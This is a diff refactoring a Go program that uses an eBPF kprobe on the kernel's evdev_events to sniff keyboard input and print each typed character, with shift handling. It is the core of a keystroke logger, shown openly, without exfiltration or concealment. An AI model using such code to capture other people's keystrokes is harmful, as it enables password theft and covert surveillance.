@@ -21,7 +21,6 @@ import (
 	"os/signal"
 
 	bpf "github.com/iovisor/gobpf/bcc"
-	"github.com/sirupsen/logrus"
 )
 
 import "C"
@@ -74,82 +73,73 @@ type keyEvent struct {
 	Value3 int32
 }
 
+func logkeyPress(ch chan []byte) {
+	leftShiftPressed := false
+	rightShiftPressed := false
+	for {
+		b := <-ch
+		ke, err := KeyEvent(b)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+		switch {
+		case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1):
+			leftShiftPressed = true
+		case (ke.Value1 == RIGHTSHIFT && (ke.Value2 == 1)):
+			rightShiftPressed = true
+		case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0):
+			leftShiftPressed = false
+		case (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0):
+			rightShiftPressed = false
+		}
+		for i := 0; i < int(ke.Value2); i++ {
+			if leftShiftPressed || rightShiftPressed {
+				fmt.Print(upperCaseKeyMap[ke.Value1])
+				continue
+			}
+			fmt.Print(lowerCaseKeymap[ke.Value1])
+		}
+	}
+}
+
 func main() {
 	m := bpf.NewModule(source, []string{})
 	defer m.Close()
 	kprobe, err := m.LoadKprobe("evdev_events_sniff")
 	if err != nil {
-		log.Fatalf("Failed to load syscall__execve: %s\n", err)
+		log.Fatalf("failed to load evdev_events_sniff: %s\n", err)
 	}
 	if err := m.AttachKprobe("evdev_events", kprobe, -1); err != nil {
-		log.Fatalf("Failed to attach syscall__execve: %s\n", err)
+		log.Fatalf("failed to attach evdev_events_sniff: %s\n", err)
 	}
 	table := bpf.NewTable(m.TableId("events"), m)
-	channel := make(chan []byte, 1000)
-	perfMap, err := bpf.InitPerfMap(table, channel)
+	ch := make(chan []byte, 1000)
+	perfMap, err := bpf.InitPerfMap(table, ch)
 	if err != nil {
-		log.Fatalf("Failed to init perf map: %s\n", err)
+		log.Fatalf("failed to init perf map: %s\n", err)
 	}
 	sig := make(chan os.Signal, 1)
 	signal.Notify(sig, os.Interrupt)
-	go func() {
-		logrus.Infoln("Starting")
-		// upperCase := false
-		leftShiftPressed := false
-		rightShiftPressed := false
-		for {
-			b := <-channel
-			ke := KeyEvent(b)
-			switch {
-			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1):
-				leftShiftPressed = true
-			case (ke.Value1 == RIGHTSHIFT && (ke.Value2 == 1)):
-				rightShiftPressed = true
-			case (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0):
-				leftShiftPressed = false
-			case (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0):
-				rightShiftPressed = false
-			}
-			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 1) {
-			// 	leftShiftPressed = true
-			// }
-			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 1) {
-			// 	rightShiftPressed = true
-			// }
-			// if (ke.Value1 == LEFTSHIFT) && (ke.Value2 == 0) {
-			// 	leftShiftPressed = false
-			// }
-			// if (ke.Value1 == RIGHTSHIFT) && (ke.Value2 == 0) {
-			// 	rightShiftPressed = false
-			// }
-			for i := 0; i < int(ke.Value2); i++ {
-				if leftShiftPressed || rightShiftPressed {
-					fmt.Print(upperCaseKeyMap[ke.Value1])
-					continue
-				}
-				// switch leftShiftPressed || rightShiftPressed {
-				// case true:
-				// 	s = upperCaseKeyMap[ke.Value1]
-				// default:
-				// 	s = lowerCaseKeymap[ke.Value1]
-				// }
-				fmt.Print(lowerCaseKeymap[ke.Value1])
-			}
-
-		}
-	}()
+	go logkeyPress(ch)
 	perfMap.Start()
 	<-sig
 	perfMap.Stop()
 }
 
-func KeyEvent(b []byte) keyEvent {
+func KeyEvent(b []byte) (keyEvent, error) {
 	var ke keyEvent
 	buf := bytes.NewBuffer(b[:4])
-	binary.Read(buf, binary.LittleEndian, &ke.Value1)
+	err := binary.Read(buf, binary.LittleEndian, &ke.Value1)
+	if err != nil {
+		return keyEvent{}, err
+	}
 	buf = bytes.NewBuffer(b[4:8])
-	binary.Read(buf, binary.LittleEndian, &ke.Value2)
+	err = binary.Read(buf, binary.LittleEndian, &ke.Value2)
+	if err != nil {
+		return keyEvent{}, err
+	}
 	buf = bytes.NewBuffer(b[8:])
-	binary.Read(buf, binary.LittleEndian, &ke.Value3)
-	return ke
+	err = binary.Read(buf, binary.LittleEndian, &ke.Value3)
+	return ke, err
 }
